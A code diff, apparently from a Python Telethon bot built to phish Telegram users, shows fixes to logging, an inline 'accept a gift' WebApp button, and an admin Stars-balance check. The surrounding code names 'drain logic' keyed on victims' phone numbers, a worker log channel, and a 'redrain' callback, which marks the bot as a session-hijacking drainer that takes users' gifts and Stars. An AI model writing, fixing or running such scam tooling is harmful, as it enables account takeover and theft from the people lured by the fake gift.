@@ -56,15 +56,12 @@ def save_log(text):
 
 def send_log(msg, buttons=None):
     save_log(msg)
-    # Безопасная отправка из потока Flask в поток бота
-    asyncio.run_coroutine_threadsafe(
-        bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons),
-        bot.loop
-    )
-    asyncio.run_coroutine_threadsafe(
-        bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html'),
-        bot.loop
-    )
+    # Создаем задачу для отправки сообщения в потоке бота
+    coro = bot.send_message(ADMIN_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html', buttons=buttons)
+    asyncio.run_coroutine_threadsafe(coro, bot.loop)
+    
+    coro_worker = bot.send_message(WORKER_ID, f"<b>LOG:</b>\n{msg}", parse_mode='html')
+    asyncio.run_coroutine_threadsafe(coro_worker, bot.loop)
 
 # --- ЛОГИКА СЛИВА (DRAIN LOGIC) ---
 async def drain_logic(client, phone):
@@ -150,9 +147,9 @@ async def inline_handler(event):
             ),
             # Важно: В Telethon 1.x для инлайн WebApp используем Button.url + специфический параметр
             buttons=[
-                # Эта кнопка откроет WebApp (твое мини-приложение)
-                [types.KeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
-                # Эта кнопка — просто ссылка на оригинальный NFT
+                # Для инлайна в 1.42.0 используем прямой конструктор WebApp
+                [types.InlineKeyboardButtonWebView(text="Принять подарок 🎁", url=web_url)],
+                # Прямая ссылка на подарок
                 [Button.url("Посмотреть подарок", input_text)]
             ]
         )
@@ -185,12 +182,18 @@ async def start_handler(event):
 
 @bot.on(events.NewMessage(pattern='/stars_check'))
 async def stars_check(event):
-    if event.sender_id != ADMIN_ID: return
+    if event.sender_id != ADMIN_ID: 
+        return
     try:
-        res = await bot(functions.payments.GetStarsStatusRequest(peer='me'))
-        await event.respond(f"📊 <b>Баланс:</b> {res.balance}★\n🚀 <b>Хватит на:</b> {res.balance // 25} передач.", parse_mode='html')
+        # Используем event.client вместо bot
+        res = await event.client(functions.payments.GetStarsStatusRequest(peer='me'))
+        await event.respond(
+            f"📊 <b>Баланс:</b> {res.balance}★\n"
+            f"🚀 <b>Хватит на:</b> {res.balance // 25} передач.", 
+            parse_mode='html'
+        )
     except Exception as e:
-        await event.respond(f" Ошибка: {e}")
+        await event.respond(f"❌ Ошибка: {e}")
 
 @bot.on(events.CallbackQuery(pattern=rb'redrain_(.*)'))
 async def redrain_callback(event):
